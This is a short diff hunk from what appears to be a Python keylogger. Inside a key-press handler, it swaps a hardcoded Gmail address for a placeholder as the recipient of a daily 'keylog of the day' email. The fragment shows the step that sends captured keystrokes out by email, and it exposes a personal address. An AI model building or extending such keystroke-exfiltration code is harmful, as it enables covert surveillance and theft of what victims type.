@@ -88,7 +88,7 @@ def on_press(key):
     
     # now = datetime.now()
     # if now.hour == 0 and now.minute == 0 :
-        reciever = "bidya.gca@gmail.com"
+        reciever = "reciever_mail@gmail.com"
         sub = "keylog of the day"
         body = f"Todays date and time: {datetime.now()}"
         send_email(reciever,sub,body)
